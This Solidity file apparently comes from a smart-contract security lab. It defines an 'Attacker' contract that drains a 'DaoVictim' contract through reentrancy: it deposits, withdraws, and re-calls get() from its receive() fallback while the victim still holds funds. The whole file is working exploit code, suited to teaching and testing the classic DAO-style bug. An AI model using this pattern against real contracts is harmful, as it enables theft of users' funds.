pragma solidity ^0.8.28;

import {DaoVictim} from "./DaoVictim.sol";

contract Attacker {

    DaoVictim public dao;

    constructor(DaoVictim _dao) payable {
        dao = _dao;
    }

    function collect() public payable {
        dao.put{value: msg.value}();
        dao.get();
    }

    receive () external payable {
        if (address(dao).balance >= msg.value) {
            dao.get();
        }
    }
}